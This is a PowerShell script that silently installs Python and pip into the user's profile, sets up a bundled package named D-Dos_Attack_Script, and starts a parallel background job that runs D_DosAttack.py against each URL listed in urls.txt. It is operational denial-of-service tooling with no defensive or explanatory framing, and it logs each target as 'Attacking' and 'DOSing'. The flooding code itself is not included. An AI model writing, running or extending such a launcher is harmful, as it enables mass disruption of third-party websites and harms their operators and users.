$ErrorActionPreference = "Stop"

Set-Location -Path $env:APPDATA
cd ..

# install python
Write-Host "==============================="
Write-Host $(Get-Location)

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe" -OutFile "python-3.10.2.exe"

./python-3.10.2.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0

$pythonPath = "${Env:AppData}\..\Local\Programs\Python\Python310"
Write-Host $pythonPath
$env:Path += ";" + $pythonPath

Write-Host "Python downloaded. " $env:Path
# install pip
cd $pythonPath
Write-Host "Python PATH: " $pythonPath

Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py"  -OutFile "get-pip.py"

dir
python get-pip.py

$env:Path += ";${pythonPath}\Scripts"

if (Test-Path "D-Dos_Attack_Script.zip") {
    Remove-Item "D-Dos_Attack_Script.zip"
}

if (Test-Path "D-Dos_Attack_Script") {
    Remove-Item "D-Dos_Attack_Script" -Recurse
}

Copy-Item -Path "${PSScriptRoot}\D-Dos_Attack_Script" -Recurse -Destination "${pythonPath}\D-Dos_Attack_Script"
Write-Host "D-Dos_Attack_Script copied" 


cd "D-Dos_Attack_Script"

pip install -r "requirements.txt"

$urls = [System.IO.File]::ReadLines("${PSScriptRoot}\urls.txt")
Write-Host $urls

$urls | ForEach-Object {
       Write-Host "Attacking  ${_}"
       Copy-Item -Path "${Env:AppData}\..\Local\Programs\Python\Python310\D-Dos_Attack_Script\D_DosAttack.py" -Destination "${Env:AppData}\..\Local\Programs\Python\Python310\D-Dos_Attack_Script\${_}_D_DosAttack.py"
       Start-Job -ScriptBlock {
       param ($url)
           cd "${Env:AppData}\..\Local\Programs\Python\Python310\D-Dos_Attack_Script"
           Write-Host "DOSing  ${url}"
           python "${Env:AppData}\..\Local\Programs\Python\Python310\D-Dos_Attack_Script\${url}_D_DosAttack.py" $url
   } -ArgumentList $_
}

foreach($job in Get-Job){
    Receive-Job -Job $job -OutVariable temp
    Write-Host ("Temp: "+$temp) 
}